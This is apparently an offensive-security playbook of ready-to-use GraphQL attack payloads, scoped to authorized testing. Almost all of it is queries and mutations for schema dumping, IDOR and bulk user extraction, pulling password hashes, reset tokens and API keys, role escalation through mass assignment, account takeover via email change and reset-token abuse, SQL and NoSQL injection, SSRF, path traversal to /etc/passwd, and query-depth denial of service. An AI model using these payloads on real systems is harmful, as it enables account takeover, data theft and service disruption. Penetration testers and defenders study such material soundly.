üß® GraphQL Pentest Playbook

Red Team & Offensive Security Playbook for GraphQL APIs
Focused on real-world exploitation after introspection exposure.

üìå Scope

This playbook is intended for:
Authorized penetration tests
Red team engagements
Internal security assessments

Assumption: GraphQL introspection is enabled or schema is known.

1Ô∏è‚É£ Basic Connectivity Test

Verify the GraphQL endpoint is reachable.

query {
  __typename
}

2Ô∏è‚É£ Full Schema Introspection

Dump the entire schema to understand:

Queries

Mutations

Input types

Sensitive fields

query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      kind
      name
      description
      fields(includeDeprecated: true) {
        name
        args {
          name
          type { name kind }
        }
        type { name kind }
      }
    }
  }
}

3Ô∏è‚É£ Query & Mutation Enumeration
List All Queries
query {
  __schema {
    queryType {
      fields {
        name
      }
    }
  }
}

List All Mutations
query {
  __schema {
    mutationType {
      fields {
        name
      }
    }
  }
}

4Ô∏è‚É£ User Enumeration & IDOR
Get Current User
query {
  me {
    id
    email
    role
  }
}

Access Arbitrary User (IDOR)
query {
  user(id: "1") {
    id
    email
    role
    isAdmin
  }
}


Try:

Incrementing IDs

Swapping UUIDs

Reusing IDs from other queries

5Ô∏è‚É£ Bulk Data Extraction
Dump All Users
query {
  users {
    id
    email
    role
  }
}

Pagination Abuse
query {
  users(first: 1000) {
    edges {
      node {
        id
        email
        role
      }
    }
  }
}

6Ô∏è‚É£ Authorization Bypass (Nested Queries)

Resolvers often fail to re-check authorization.

query {
  me {
    email
    organization {
      id
      name
      users {
        id
        email
        role
      }
    }
  }
}


üö® If successful ‚Üí tenant-wide data exposure

7Ô∏è‚É£ Excessive Data Exposure

Try requesting sensitive fields even if UI doesn‚Äôt show them.

query {
  user(id: "1") {
    password
    passwordHash
    resetToken
    apiKey
    mfaSecret
  }
}

8Ô∏è‚É£ Mass Assignment / Privilege Escalation
Role Escalation
mutation {
  updateUser(input: {
    id: "1"
    role: "ADMIN"
    isAdmin: true
  }) {
    id
    role
  }
}

Account Modification
mutation {
  updateUser(input: {
    id: "1"
    email: "attacker@evil.com"
  }) {
    email
  }
}

9Ô∏è‚É£ Account Takeover Primitives
Trigger Password Reset
mutation {
  requestPasswordReset(email: "victim@company.com")
}

Reset Token Abuse
mutation {
  resetPassword(
    token: "AAAA"
    newPassword: "P@ssw0rd123"
  )
}

üîü Business Logic Abuse
mutation {
  refundOrder(orderId: "123") {
    status
  }
}

mutation {
  applyCoupon(orderId: "123", code: "FREE100")
}


Look for:

Missing state validation

Reusable workflows

Approval bypass

1Ô∏è‚É£1Ô∏è‚É£ Injection Testing
SQL Injection
query {
  user(email: "test' OR 1=1--") {
    email
  }
}

NoSQL Injection
query {
  user(email: { "$ne": null }) {
    email
  }
}

1Ô∏è‚É£2Ô∏è‚É£ File Handling / SSRF
mutation {
  uploadFile(url: "http://127.0.0.1:8080/admin")
}

query {
  downloadFile(path: "../../../../etc/passwd")
}

1Ô∏è‚É£3Ô∏è‚É£ Denial of Service (DoS)
Deep Query
query {
  a {
    a {
      a {
        a {
          a {
            id
          }
        }
      }
    }
  }
}

Alias Bomb
query {
  u1:user(id:1){email}
  u2:user(id:2){email}
  u3:user(id:3){email}
  u999:user(id:999){email}
}

1Ô∏è‚É£4Ô∏è‚É£ Authentication Bypass Testing

Test queries with:

No Authorization header

Expired token

Low-privileged token

query {
  users {
    email
  }
}

1Ô∏è‚É£5Ô∏è‚É£ Subscriptions (Real-Time Data Leaks)
subscription {
  userUpdated {
    id
    email
    role
  }
}

üß† Red Team Notes

High-impact attack chains:

Introspection ‚Üí IDOR ‚Üí Role Escalation ‚Üí Tenant Takeover ‚Üí Data Exfiltration


GraphQL vulnerabilities are often logic flaws, not CVEs.

üõ† Recommended Tools

InQL (Burp Extension)

GraphQL Voyager

GraphQLmap

Burp Repeater + Macros
